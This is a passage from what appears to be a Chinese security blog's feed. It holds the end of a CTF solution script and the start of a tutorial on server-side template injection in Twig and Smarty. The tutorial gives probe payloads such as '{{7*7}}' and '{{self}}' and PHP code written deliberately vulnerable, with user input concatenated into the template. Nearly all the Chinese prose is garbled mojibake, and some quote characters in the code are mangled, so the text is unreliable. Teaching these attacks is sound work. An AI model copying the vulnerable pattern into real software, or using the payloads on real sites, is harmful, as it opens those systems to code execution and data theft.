s=requests.session()//‰∏Ä‰∏™Ë¶ÅÁÇπÂøÖÈ°ª‰øùÊåÅsession‰∏ÄËá¥Âê¶ÂàôÈîÄÊØÅ‰∫Ü‰πãÂêéÊó†Ê≥ïÂè†Âä†ÂçÅÊ¨°„ÄÇ r=s.get(url) for i in range(0,20): url=&quot;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=&quot;+r.content[0:2] r=s.get(url) print r.content[0:44]PHPË∂ÖÂÖ®Â±ÄÂèòÈáèCTFhttps://www.ichunqiu.com/writeup/detail/717]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTIÊ®°ÊùøÊ≥®ÂÖ•]]></title>
    <url>%2F2018%2F11%2F11%2FSSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂºÄÂ±Ä‰∏ÄÂº†ÂõæÔºåÂßøÂäøÂÖ®Èù†yy Ê®°ÊùøÂºïÊìéÂèØ‰ª•ËÆ©ÔºàÁΩëÁ´ôÔºâÁ®ãÂ∫èÂÆûÁé∞ÁïåÈù¢‰∏éÊï∞ÊçÆÂàÜÁ¶ªÔºå‰∏öÂä°‰ª£Á†Å‰∏éÈÄªËæë‰ª£Á†ÅÁöÑÂàÜÁ¶ªÔºåËøôÂ§ßÂ§ßÊèêÂçá‰∫ÜÂºÄÂèëÊïàÁéáÔºåËâØÂ•ΩÁöÑËÆæËÆ°‰πü‰ΩøÂæó‰ª£Á†ÅÈáçÁî®ÂèòÂæóÊõ¥Âä†ÂÆπÊòì„ÄÇ‰∏éÊ≠§ÂêåÊó∂ÔºåÂÆÉ‰πüÊâ©Â±ï‰∫ÜÈªëÂÆ¢ÁöÑÊîªÂáªÈù¢„ÄÇÈô§‰∫ÜÂ∏∏ËßÑÁöÑ XSS Â§ñÔºåÊ≥®ÂÖ•Âà∞Ê®°Êùø‰∏≠ÁöÑ‰ª£Á†ÅËøòÊúâÂèØËÉΩÂºïÂèë RCEÔºàËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºâ„ÄÇÈÄöÂ∏∏Êù•ËØ¥ÔºåËøôÁ±ªÈóÆÈ¢ò‰ºöÂú®ÂçöÂÆ¢ÔºåCMSÔºåwiki ‰∏≠‰∫ßÁîü„ÄÇËôΩÁÑ∂Ê®°ÊùøÂºïÊìé‰ºöÊèê‰æõÊ≤ôÁÆ±Êú∫Âà∂ÔºåÊîªÂáªËÄÖ‰æùÁÑ∂ÊúâËÆ∏Â§öÊâãÊÆµÁªïËøáÂÆÉ„ÄÇ ÂíåÂ∏∏ËßÅWebÊ≥®ÂÖ•ÁöÑÊàêÂõ†‰∏ÄÊ†∑Ôºå‰πüÊòØÊúçÂä°Á´ØÊé•Êî∂‰∫ÜÁî®Êà∑ÁöÑËæìÂÖ•ÔºåÂ∞ÜÂÖ∂‰Ωú‰∏∫ Web Â∫îÁî®Ê®°ÊùøÂÜÖÂÆπÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÂú®ËøõË°åÁõÆÊ†áÁºñËØëÊ∏≤ÊüìÁöÑËøáÁ®ã‰∏≠ÔºåÊâßË°å‰∫ÜÁî®Êà∑ÊèíÂÖ•ÁöÑÊÅ∂ÊÑèÂÜÖÂÆπÔºåÂõ†ËÄåÂèØËÉΩÂØºËá¥‰∫ÜÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤„ÄÅ‰ª£Á†ÅÊâßË°å„ÄÅGetShell Á≠âÈóÆÈ¢ò„ÄÇÂÖ∂ÂΩ±ÂìçËåÉÂõ¥‰∏ªË¶ÅÂèñÂÜ≥‰∫éÊ®°ÁâàÂºïÊìéÁöÑÂ§çÊùÇÊÄß„ÄÇ Â∞èËØæÂ†Ç‚ÄîÊ®°ÊùøÊ∏≤ÊüìÊòØwhatÔºüÈ¶ñÂÖà Ê®°ÊùøÊ∏≤ÊüìÂàÜËß£‰∏∫ÂâçÁ´ØÊ∏≤ÊüìÂíåÂêéÁ´ØÊ∏≤ÊüìÔºåËøòÊúâÊµèËßàÂô®Ê∏≤Êüì„ÄÇ Ê®°ÊùøÂè™ÊòØ‰∏ÄÁßçÊèê‰æõÁªôÁ®ãÂ∫èÊù•Ëß£ÊûêÁöÑ‰∏ÄÁßçËØ≠Ê≥ïÔºåÊç¢Âè•ËØùËØ¥ÔºåÊ®°ÊùøÊòØÁî®‰∫é‰ªéÊï∞ÊçÆÔºàÂèòÈáèÔºâÂà∞ÂÆûÈôÖÁöÑËßÜËßâË°®Áé∞ÔºàHTML‰ª£Á†ÅÔºâËøôÈ°πÂ∑•‰ΩúÁöÑ‰∏ÄÁßçÂÆûÁé∞ÊâãÊÆµÔºåËÄåËøôÁßçÊâãÊÆµ‰∏çËÆ∫Âú®ÂâçÁ´ØËøòÊòØÂêéÁ´ØÈÉΩÊúâÂ∫îÁî®„ÄÇ ÈÄö‰øóÁÇπÁêÜËß£ÔºöÊãøÂà∞Êï∞ÊçÆÔºåÂ°ûÂà∞Ê®°ÊùøÈáåÔºåÁÑ∂ÂêéËÆ©Ê∏≤ÊüìÂºïÊìéÂ∞ÜËµõËøõÂéªÁöÑ‰∏úË•øÁîüÊàê html ÁöÑÊñáÊú¨ÔºåËøîÂõûÁªôÊµèËßàÂô®ÔºåËøôÊ†∑ÂÅöÁöÑÂ•ΩÂ§ÑÂ±ïÁ§∫Êï∞ÊçÆÂø´ÔºåÂ§ßÂ§ßÊèêÂçáÊïàÁéá„ÄÇ ÂêéÁ´ØÊ∏≤Êüì ÂêéÁ´ØÊ∏≤ÊüìHTMLÁöÑÊÉÖÂÜµ‰∏ãÔºåÊµèËßàÂô®‰ºöÁõ¥Êé•Êé•Êî∂Âà∞ÁªèËøáÊúçÂä°Âô®ËÆ°ÁÆó‰πãÂêéÁöÑÂëàÁé∞ÁªôÁî®Êà∑ÁöÑÊúÄÁªàÁöÑHTMLÂ≠óÁ¨¶‰∏≤ÔºåËøôÈáåÁöÑËÆ°ÁÆóÂ∞±ÊòØÊúçÂä°Âô®ÁªèËøáËß£ÊûêÂ≠òÊîæÂú®ÊúçÂä°Âô®Á´ØÁöÑÊ®°ÊùøÊñá‰ª∂Êù•ÂÆåÊàêÁöÑÔºåÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÊµèËßàÂô®Âè™ËøõË°å‰∫ÜHTMLÁöÑËß£ÊûêÔºå‰ª•ÂèäÈÄöËøáÊìç‰ΩúÁ≥ªÁªüÊèê‰æõÁöÑÊìçÁ∫µÊòæÁ§∫Âô®ÊòæÁ§∫ÂÜÖÂÆπÁöÑÁ≥ªÁªüË∞ÉÁî®Âú®ÊòæÁ§∫Âô®‰∏äÊääHTMLÊâÄ‰ª£Ë°®ÁöÑÂõæÂÉèÊòæÁ§∫ÁªôÁî®Êà∑„ÄÇ ÂÆûÁé∞ÔºöÂêéÁ´ØÊãºÂ≠óÁ¨¶‰∏≤Âëó‚Ä¶‚Ä¶ ÔºàÁêÜËÆ∫‰∏äÂêéÁ´ØÊ®°Êùø‰πüÊòØÂ≠óÁ¨¶‰∏≤Ôºâ Â•ΩÂ§ÑÔºöÊ®°ÊùøÁªü‰∏ÄÂú®ÂêéÁ´Ø„ÄÇÂâçÁ´ØÔºàÁõ∏ÂØπÔºâÁúÅ‰∫ãÔºå‰∏çÂç†Áî®ÂÆ¢Êà∑Á´ØËøêÁÆóËµÑÊ∫êÔºàËß£ÊûêÊ®°ÊùøÔºâÔºåÂè™Ë¶Å‰∏çÂ§ßÊîπÁªìÊûÑÔºåÊñáÂ≠óÂï•ÁöÑÂ∞è‰øÆÊîπÂêéÁ´ØÊîπ‰∫ÜÂ∞±Â•Ω‰∫Ü„ÄÇ ÂùèÂ§ÑÔºöÂç†Áî®ÔºàÈÉ®ÂàÜ„ÄÅÂ∞ëÈÉ®ÂàÜÔºâÊúçÂä°Âô®ËøêÁÆóËµÑÊ∫ê„ÄÅÔºåresponse Âá∫ÁöÑÊï∞ÊçÆÈáè‰ºöÔºàÁ®çÔºâÂ§ßÁÇπÔºåÊ®°ÊùøÊîπ‰∫ÜÂâçÁ´ØÁöÑ‰∫§‰∫íÂíåÊ†∑Âºè‰ªÄ‰πàÁöÑ‰∏ÄÊ†∑ÂæóË∑üÁùÄËÅîÂä®‰øÆÊîπ„ÄÇ ÂâçÁ´ØÊ∏≤Êüì ÂâçÁ´ØÊ∏≤ÊüìÂ∞±ÊòØÊåáÊµèËßàÂô®‰ºö‰ªéÂêéÁ´ØÂæóÂà∞‰∏Ä‰∫õ‰ø°ÊÅØÔºåËøô‰∫õ‰ø°ÊÅØÊàñËÆ∏ÊòØÈÄÇÁî®‰∫éÈ¢ò‰∏ªÊâÄËØ¥ÁöÑangularjsÁöÑÊ®°ÊùøÊñá‰ª∂Ôºå‰∫¶ÊàñÊòØJSONÁ≠âÂêÑÁßçÊï∞ÊçÆ‰∫§Êç¢Ê†ºÂºèÊâÄÂåÖË£ÖÁöÑÊï∞ÊçÆÔºåÁîöËá≥ÊòØÁõ¥Êé•ÁöÑÂêàÊ≥ïÁöÑHTMLÂ≠óÁ¨¶‰∏≤„ÄÇËøô‰∫õÂΩ¢ÂºèÈÉΩ‰∏çÈáçË¶ÅÔºåÈáçË¶ÅÁöÑÊòØÔºåÂ∞ÜËøô‰∫õ‰ø°ÊÅØÁªÑÁªáÊéíÂàóÂΩ¢ÊàêÊúÄÁªàÂèØËØªÁöÑHTMLÂ≠óÁ¨¶‰∏≤ÊòØÁî±ÊµèËßàÂô®Êù•ÂÆåÊàêÁöÑÔºåÂú®ÂΩ¢Êàê‰∫ÜHTMLÂ≠óÁ¨¶‰∏≤‰πãÂêéÔºåÂÜçËøõË°åÊòæÁ§∫„ÄÇ Â•ΩÂ§ÑÔºö‰∏çÂç†Áî®ÊúçÂä°Á´ØËøêÁÆóËµÑÊ∫êÔºàËß£ÊûêÊ®°ÊùøÔºâÔºåÊ®°ÊùøÂú®ÂâçÁ´ØÔºàÂæàÊúâÂèØËÉΩ‰ªÖÈÉ®ÂàÜÂú®ÂâçÁ´ØÔºâÔºåÊîπÁªìÊûÑÂèò‰∫§‰∫íÈÉΩÂâçÁ´ØËá™Â∑±Êù•‰∫ÜÔºåÊîπÂÆåËá™Â∑±Ë∞ÉÂ∞±Ë°å„ÄÇ‰∏çÁî®È∫ªÁÉ¶ÂêéÁ´ØÂÜçËÅîË∞ÉÁ•ûÈ©¨ÁöÑ„ÄÇ ÂùèÂ§ÑÔºöÂç†Áî®Ôºà‰∏ÄÈÉ®ÂàÜ„ÄÅÂ∞ëÈÉ®ÂàÜÔºâÂÆ¢Êà∑Á´ØËøêÁÆóËµÑÊ∫êÔºàËß£ÊûêÊ®°ÊùøÔºâ„ÄÇÂâçÁ´Ø‰ª£Á†ÅÂ§öÁÇπÔºåÊØïÁ´üÂåÖÂê´Ê®°Êùø‰ª£Á†Å‰∫Ü‰πà„ÄÇËÑöÊú¨ÊòØ‰∏çÊòØÈ¶ñÊ¨°‰∏ãÂ∞±ÊÖ¢ÁÇπ‰∫ÜÔºàÁúã‰Ω†Âú®ÊÑè‰∏çÂú®ÊÑèËøô‰∏™ÊØïÁ´üËÉΩ304ÂíåCDNÂï•ÁöÑÔºâ„ÄÇÂèØËÉΩÈÄ†ÊàêÂâçÂêé‰∏§‰ªΩÊ®°ÊùøÁöÑÊÉÖÂÜµÔºåÊÄªÂΩíË¶ÅÂêéÁ´ØÂêêÂá∫‰∏™È¶ñÂ±èÂï•ÁöÑÂÖàËÆ©Áî®Êà∑ÁúãËßÅÂêß„ÄÇÈÇ£ËøôÈÉ®ÂàÜÈ°µÈù¢Ê®°Êùø‰∏çÂ∞±ÊòØÂêéÁ´ØÊãºÂ•Ω‰∫ÜÂêêÂá∫Êù•ÁöÑ‰πà„ÄÇ Á§∫‰æã1ÔºöÂÆö‰πâ‰∏Ä‰∏™Ê®°ÊùøÔºå‰æãÂ¶Ç &lt;html&gt; &lt;div&gt;{$what}&lt;/div&gt; &lt;/html&gt;ËøôÂè™ÊòØ‰∏Ä‰∏™Ê®°Êùø„ÄÇ{$what}ÊòØÊï∞ÊçÆ„ÄÇÊ≠§Êó∂‰∏çÁü•ÈÅìÊï∞ÊçÆÊòØ‰ªÄ‰πà„ÄÇ Â¶ÇÊûúÊàëÊÉ≥htmlÈáåÈù¢Êàê‰∏∫ &lt;div&gt;peiqi&lt;/div&gt; Ê∏≤ÊüìÂà∞html‰ª£Á†ÅÈáåÊ∏≤ÊüìÂÆåÊàêÂêé &lt;html&gt; &lt;div&gt;peiqi&lt;/div&gt; &lt;/html&gt;ÂΩìÁÑ∂ËøôÂè™ÊòØÊúÄÁÆÄÁ≠îÁöÑ‰æãÂ≠êÔºõ‰∏ÄËà¨Êù•ËØ¥ÔºåËá≥Â∞ë‰ºöÊèê‰æõÂàÜÊîØÔºåËø≠‰ª£„ÄÇËøòÊúâ‰∏Ä‰∫õÂÜÖÁΩÆÂáΩÊï∞ÔºåÂ¶ÇÊ†ºÂºèÂåñÁ≠âÁ≠âÈÇ£‰πà {$what}Ëøô‰∏™Êï∞ÊçÆÂ¶Ç‰Ωï‰ª£Á†Å‰º†ÂÖ•„ÄÇÊØîÂ¶ÇÊàëÂ∑•‰ΩúÁî®ÁöÑÊ®°ÊùøÂºïÊìéÊòØsmartyÊàëÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Ê®°Êùø„ÄÇ &lt;html&gt; &lt;div&gt;{$what}&lt;/div&gt; &lt;/html&gt; js‰ª£Á†ÅÂ∞±ÊòØËøô‰πàÂÜôÂ∞±ÂèØ‰ª•‰∫Ü var tpl= new jSmart(tplStr);//tplStrÂ∞±ÊòØÊ®°ÊùøÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ var content = &quot;Hello World&quot;; tpl.fetch({what:content});ËøôÊ†∑Â∞±ÂèØ‰ª•‰∫ÜÂÖ∂‰ΩôÁöÑÂ∞±‰∫§ÁªôÂºïÊìéÂéªÊ∏≤ÊüìÊâßË°å‰∫Ü„ÄÇ Á§∫‰æã2ÔºöÊ®°ÊùøÔºöfront.tpl &lt;div&gt; {%$a%} &lt;/div&gt;ÂêéÁ´ØÔºö ËÆæÁΩÆÂèòÈáèÔºö$smarty-&gt;assign(‚Äòa‚Äô, ‚Äògive data‚Äô);Â±ïÁ§∫Ê®°ÊùøÔºö$smarty-&gt;display(‚Äúfront.tpl‚Äù);Âà∞ÂâçÁ´ØÊó∂ÊòØÊ∏≤ÊüìÂ•ΩÁöÑhtml‰∏≤Ôºö &lt;div&gt; give data &lt;/div&gt;ËøôÁßçÊñπÂºèÁöÑÁâπÁÇπÊòØÂ±ïÁ§∫Êï∞ÊçÆÂø´ÔºåÁõ¥Êé•ÂêéÁ´ØÊãºË£ÖÂ•ΩÊï∞ÊçÆ‰∏éÊ®°ÊùøÔºåÂ±ïÁé∞Âà∞Áî®Êà∑Èù¢Ââç„ÄÇ ‰∏∫‰ªÄ‰πàÈúÄË¶ÅÊúçÂä°Âô®Ê®°ÊùøÈ¶ñÂÖàËß£Èáä‰∏Ä‰∏ã‰∏∫‰ªÄ‰πàHTML‰ª£Á†ÅÂíåÂ∫îÁî®Á®ãÂ∫èÈÄªËæëÊ∑∑ÂêàÂú®‰∏ÄËµ∑‰∏çÂ•ΩÔºåÁúã‰∏ãÈù¢ÁöÑ‰æãÂ≠ê‰Ω†Â∞±Áü•ÈÅì‰∫Ü„ÄÇÂÅáÂ¶Ç‰Ω†‰ΩøÁî®‰∏ãÈù¢ÁöÑ‰ª£Á†Å‰∏∫‰Ω†ÁöÑÁî®Êà∑Êèê‰æõÊúçÂä°Ôºö Ëøô‰∏ç‰ªÖ‰ªÖÊòØÈùôÊÄÅHTML‰ª£Á†Å„ÄÇÁî®Êà∑ÂêçÊòØ‰ªécookieÈáåËé∑ÂèñÂπ∂‰∏îËá™Âä®Â°´ÂÜôÁöÑ„ÄÇËøôÊ†∑‰∏ÄÊù•ÔºåÂè™Ë¶Å‰Ω†‰πãÂâçÁôªÂΩïËøáËØ•ÁΩëÁ´ôÔºå‰Ω†Â∞±Êó†ÈúÄÂÜçÊ¨°ËæìÂÖ•„ÄÇ‰ΩÜÊòØËøôÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÈÇ£Â∞±ÊòØ‰Ω†ÂøÖÈ°ªÈÄöËøáÊüêÁßçÂΩ¢ÂºèÂ∞ÜÂÄºÊèíÂÖ•Âà∞HTMLÊñáÊ°£‰∏≠ÔºåÊúâ‰∏§ÁßçÊñπÊ≥ïÂèØ‰ª•ÂÆûÁé∞Ôºå‰∏ÄÁßçÊòØÊ≠£Á°ÆÁöÑÔºå‰∏ÄÁßçÊòØÊúâÂç±ÂÆ≥ÁöÑ„ÄÇ‰∏çËøáÊàë‰ª¨Ë¶ÅÂÖàÈóÆ‰∏Ä‰∏ãÔºå‰∏∫‰ªÄ‰πàË¶ÅËøô‰πàÂÅö„ÄÇ‰∏ãÂõæÂ±ïÁ§∫‰∫ÜËß£ÂÜ≥ËØ•ÈóÆÈ¢òÁöÑÂÆåÂÖ®ÈîôËØØÁöÑÊñπÊ≥ïÔºö ËøôÊÆµ‰ª£Á†ÅÊúâÂæàÂ§öÈóÆÈ¢òÔºå‰ΩúËÄÖ‰∏ç‰ªÖ‰ªÖÊ≤°ÊúâÂØπÁî®Êà∑ÁöÑËæìÂÖ•ËøõË°åÂ§ÑÁêÜÔºåHTML‰ª£Á†ÅÂíåPHP‰ª£Á†ÅÂ§çÊùÇÁöÑÊ∑∑ÂêàÂú®‰∏ÄËµ∑ÔºåÈùûÂ∏∏Èöæ‰ª•ÁêÜËß£„ÄÇÈÉ®ÂàÜHTML‰ª£Á†ÅÂàÜÂ∏ÉÂú®Â§ö‰∏™ÂáΩÊï∞‰∏≠ÔºåËøôËøò‰∏çÁÆó‰ªÄ‰πàÔºåÂΩì‰Ω†Â∞ùËØï‰øÆÊîπHTML‰ª£Á†Å‰∏≠‰ªª‰ΩïÂÜÖÂÆπÊó∂Ôºå‰Ω†ÊâçÂèëÁé∞ÊúâÂ§öÈöæÂèóÔºåÊØîÂ¶ÇÊñ∞Â¢ûcssÁ±ªÊàñ‰øÆÊîπHTMLÊ†áÁ≠æÁöÑÈ°∫Â∫è„ÄÇ ‰∏äÈù¢Ëøô‰∏™‰æãÂ≠êÊòæÁÑ∂ÊòØÊúâÊÑèÂÜôÁöÑËøô‰πàÁÉÇÁöÑÔºå‰∏çËøáÂèØ‰ª•ÈÄöËøáÊ†ºÂºèÂåñËøõË°å‰ºòÂåñ„ÄÇÁÑ∂ËÄåÔºåÂú®Â§ßÂûãÁöÑ‰ª£Á†ÅÂ∫ì‰∏≠ÔºåÂç≥‰Ωø‰ª£Á†ÅÊ†ºÂºèËâØÂ•ΩÔºå‰πü‰ºöÂæàÂø´ÂèòÂæóÊó†Ê≥ïÁÆ°ÁêÜ„ÄÇËøôÂ∞±ÊòØ‰∏∫‰ªÄ‰πàÊàë‰ª¨ÈúÄË¶ÅÊ®°Êùø„ÄÇ ‰∏é‰∏äÈù¢Ê∑∑‰π±ÁöÑ‰ª£Á†ÅÁõ∏ÊØîÔºåÊúçÂä°Âô®Á´ØÊ®°ÊùøÊèê‰æõ‰∫Ü‰∏ÄÁßçÊõ¥Âä†ÁÆÄÂçïÁöÑÊñπÊ≥ïÊù•ÁÆ°ÁêÜÂä®ÊÄÅÁîüÊàêÁöÑHTML‰ª£Á†Å„ÄÇÊúÄÂ§ßÁöÑ‰ºòÁÇπÂ∞±ÊòØ‰Ω†ÂèØ‰ª•Âú®ÊúçÂä°Âô®Á´ØÂä®ÊÄÅÁîüÊàêHTMLÈ°µÈù¢ÔºåÁúãËµ∑Êù•Ë∑üÈùôÊÄÅHTMLÈ°µÈù¢‰∏ÄÊ†∑„ÄÇÁé∞Âú®Êàë‰ª¨Êù•ÁúãÁúãÔºåÂΩìÊàë‰ª¨‰ΩøÁî®ÊúçÂä°Âô®Á´ØÊ®°ÊùøÊó∂ÔºåÂ§çÊùÇÁöÑ‰ª£Á†ÅÁúãËµ∑Êù•Â¶Ç‰Ωï„ÄÇ ËøôÂØπÂâçÈù¢ÁöÑ‰ª£Á†ÅÂÅö‰∫Ü‰∏Ä‰∫õ‰ºòÂåñÔºåÂÆÉ‰æùÁÑ∂ÊòØÈùôÊÄÅÁöÑ„ÄÇ‰∏∫‰∫ÜÊòæÁ§∫Ê≠£Á°ÆÁöÑ‰ø°ÊÅØËÄå‰∏çÊòØÂ§ßÊã¨Âè∑Âç†‰ΩçÁ¨¶ÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™ÊõøÊç¢ÂÆÉ‰ª¨ÁöÑÊ®°ÊùøÂºïÊìé„ÄÇÂêéÁ´Ø‰ª£Á†ÅÂèØËÉΩÊòØËøôÊ†∑ÁöÑ„ÄÇ ËøôÊÆµ‰ª£Á†ÅÁöÑÊÑèÊÄùÈùûÂ∏∏Ê∏ÖÊ•öÔºåÈ¶ñÂÖàÂä†ËΩΩlogin.tplÊ®°ÊùøÊñá‰ª∂ÔºåÁÑ∂ÂêéÂØπ‰∏éÊ®°Êùø‰∏≠ÂêçÁß∞Áõ∏ÂêåÁöÑÂèòÈáèËµãÂÄºÔºàÂ§ßÊã¨Âè∑ÈáåÁöÑÂèòÈáèÔºâÔºåÁÑ∂ÂêéË∞ÉÁî®show()ÂáΩÊï∞ÔºåÁõ∏Â∫îÁöÑÊõøÊç¢ÂÆÉ‰ª¨ÁöÑÂÜÖÂÆπÂπ∂ËæìÂá∫HTML‰ª£Á†Å„ÄÇÁÑ∂ËÄåÔºåÊàë‰ª¨Âú®Ê®°Êùø‰∏≠Â¢ûÂä†‰∫ÜÊñ∞ÁöÑÂäüËÉΩÔºåËøôÂ∞Ü‰ºöÂêëÁî®Êà∑Â±ïÁ§∫Ê®°ÊùøÊ∏≤ÊüìÁöÑÊó∂Èó¥„ÄÇ ‰ªÄ‰πàÊòØÊúçÂä°Á´ØÊ®°ÊùøÊ≥®ÂÖ•ÈÄöËøáÊ®°ÊùøÔºåWebÂ∫îÁî®ÂèØ‰ª•ÊääËæìÂÖ•ËΩ¨Êç¢ÊàêÁâπÂÆöÁöÑHTMLÊñá‰ª∂ÊàñËÄÖemailÊ†ºÂºè„ÄÇÂ∞±Êãø‰∏Ä‰∏™ÈîÄÂîÆËΩØ‰ª∂Êù•ËØ¥ÔºåÊàë‰ª¨ÂÅáËÆæÂÆÉ‰ºöÂèëÈÄÅÂ§ßÈáèÁöÑÈÇÆ‰ª∂ÁªôÂÆ¢Êà∑ÔºåÂπ∂Âú®ÊØèÂ∞ÅÈÇÆ‰ª∂ÂâçSKEÊèíÂÖ•ÈóÆÂÄôËØ≠ÔºåÂÆÉ‰ºöÈÄöËøáTwigÔºà‰∏Ä‰∏™Ê®°ÊùøÂºïÊìéÔºâÂÅöÂ¶Ç‰∏ãÂ§ÑÁêÜÔºö $output = $twig-&gt;render( $_GET[‚Äòcustom_email‚Äô] , array(‚Äúfirst_name‚Äù =&gt; $user.first_name) );ÊúâÁªèÈ™åÁöÑËØªËÄÖÂèØËÉΩËøÖÈÄüÂèëÁé∞ XSSÔºå‰ΩÜÊòØÈóÆÈ¢ò‰∏çÊ≠¢Â¶ÇÊ≠§„ÄÇËøôË°å‰ª£Á†ÅÂÖ∂ÂÆûÊúâÊõ¥Ê∑±Â±ÇÊ¨°ÁöÑÈöêÊÇ£ÔºåÂÅáËÆæÊàë‰ª¨ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÔºö custom_email={{7*7}} // GET ÂèÇÊï∞ 49 // $output ÁªìÊûú ËøòÊúâÊõ¥Á•ûÂ•áÁöÑÁªìÊûúÔºö custom_email={{self}} // GET ÂèÇÊï∞ Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // ÈîôËØØÊàë‰ª¨‰∏çÈöæÁåúÂà∞ÊúçÂä°Âô®ÊâßË°å‰∫ÜÊàë‰ª¨‰º†ËøáÂéªÁöÑÊï∞ÊçÆ„ÄÇÊØèÂΩìÊúçÂä°Âô®Áî®Ê®°ÊùøÂºïÊìéËß£ÊûêÁî®Êà∑ÁöÑËæìÂÖ•Êó∂ÔºåËøôÁ±ªÈóÆÈ¢òÈÉΩÊúâÂèØËÉΩÂèëÁîü„ÄÇÈô§‰∫ÜÂ∏∏ËßÑÁöÑËæìÂÖ•Â§ñÔºåÊîªÂáªËÄÖËøòÂèØ‰ª•ÈÄöËøá LFIÔºàÊñá‰ª∂ÂåÖÂê´ÔºâËß¶ÂèëÂÆÉ„ÄÇÊ®°ÊùøÊ≥®ÂÖ•Âíå SQL Ê≥®ÂÖ•ÁöÑ‰∫ßÁîüÂéüÂõ†ÊúâÂá†ÂàÜÁõ∏‰ºº‚Äî‚ÄîÈÉΩÊòØÂ∞ÜÊú™ËøáÊª§ÁöÑÊï∞ÊçÆ‰º†ÁªôÂºïÊìéËß£Êûê„ÄÇ ‰∏∫‰ªÄ‰πàÊàë‰ª¨Âú®Ê®°ÊùøÊ≥®ÂÖ•ÂâçÂä†‚ÄúÊúçÂä°Á´Ø‚ÄùÂë¢ÔºüËøôÊòØ‰∏∫‰∫ÜÂíå jQueryÔºåKnockoutJS ‰∫ßÁîüÁöÑÂÆ¢Êà∑Á´ØÊ®°ÊùøÊ≥®ÂÖ•Âå∫Âà´ÂºÄÊù•„ÄÇÈÄöÂ∏∏ÁöÑÊù•ËÆ≤ÔºåÂâçËÄÖÁîöËá≥ÂèØ‰ª•ËÆ©ÊîªÂáªËÄÖÊâßË°å‰ªªÊÑè‰ª£Á†ÅÔºåËÄåÂêéËÄÖÂè™ËÉΩ XSS„ÄÇ Ê≥®ÂÖ•ÂéüÁêÜ&lt;?php require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); // Â∞ÜÁî®Êà∑ËæìÂÖ•‰Ωú‰∏∫Ê®°ÁâàÂèòÈáèÁöÑÂÄº echo $output; ?&gt;‰ΩøÁî® Twig Ê®°ÁâàÂºïÊìéÊ∏≤ÊüìÈ°µÈù¢ÔºåÂÖ∂‰∏≠Ê®°ÁâàÂê´Êúâ ÂèòÈáèÔºåÂÖ∂Ê®°ÁâàÂèòÈáèÂÄºÊù•Ëá™‰∫é GET ËØ∑Ê±ÇÂèÇÊï∞ $_GET[‚Äúname‚Äù]„ÄÇ ÊòæÁÑ∂ËøôÊÆµ‰ª£Á†ÅÂπ∂Ê≤°Êúâ‰ªÄ‰πàÈóÆÈ¢òÔºåÂç≥‰Ωø‰Ω†ÊÉ≥ÈÄöËøá name ÂèÇÊï∞‰º†ÈÄí‰∏ÄÊÆµ JavaScript ‰ª£Á†ÅÁªôÊúçÂä°Á´ØËøõË°åÊ∏≤ÊüìÔºå‰πüËÆ∏‰Ω†‰ºöËÆ§‰∏∫ËøôÈáåÂèØ‰ª•ËøõË°å XSSÔºå ‰ΩÜÊòØÁî±‰∫éÊ®°ÁâàÂºïÊìé‰∏ÄËà¨ÈÉΩÈªòËÆ§ÂØπÊ∏≤ÊüìÁöÑÂèòÈáèÂÄºËøõË°åÁºñÁ†ÅÂíåËΩ¨‰πâÔºåÊâÄ‰ª•Âπ∂‰∏ç‰ºöÈÄ†ÊàêË∑®Á´ôËÑöÊú¨ÊîªÂáªÔºö ‰ΩÜÊòØÔºåÂ¶ÇÊûúÊ∏≤ÊüìÁöÑÊ®°ÁâàÂÜÖÂÆπÂèóÂà∞Áî®Êà∑ÁöÑÊéßÂà∂ÔºåÊÉÖÂÜµÂ∞±‰∏ç‰∏ÄÊ†∑‰∫Ü„ÄÇ‰øÆÊîπ‰ª£Á†Å‰∏∫Ôºö &lt;?php require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;); // Â∞ÜÁî®Êà∑ËæìÂÖ•‰Ωú‰∏∫Ê®°ÁâàÂÜÖÂÆπÁöÑ‰∏ÄÈÉ®ÂàÜ echo $output; ?&gt;‰∏äÈù¢ËøôÊÆµ‰ª£Á†ÅÂú®ÊûÑÂª∫Ê®°ÁâàÊó∂,ÊãºÊé•‰∫ÜÁî®Êà∑ËæìÂÖ•‰Ωú‰∏∫Ê®°ÊùøÁöÑÂÜÖÂÆπ,Áé∞Âú®Â¶ÇÊûúÂÜçÂêëÊúçÂä°Á´ØÁõ¥Êé•‰º†ÈÄí JavaScript ‰ª£Á†Å,Áî®Êà∑ËæìÂÖ•‰ºöÂéüÊ†∑ËæìÂá∫,ÊµãËØïÁªìÊûúÊòæËÄåÊòìËßÅ„ÄÇ Âú® Twig Ê®°ÊùøÂºïÊìéÈáå, Èô§‰∫ÜÂèØ‰ª•ËæìÂá∫‰º†ÈÄíÁöÑÂèòÈáè‰ª•Â§ñ,ËøòËÉΩÊâßË°å‰∏Ä‰∫õÂü∫Êú¨ÁöÑË°®ËææÂºèÁÑ∂ÂêéÂ∞ÜÂÖ∂ÁªìÊûú‰Ωú‰∏∫ËØ•Ê®°ÊùøÂèòÈáèÁöÑÂÄº,‰æãÂ¶ÇËøôÈáåÁî®Êà∑ËæìÂÖ• name=20 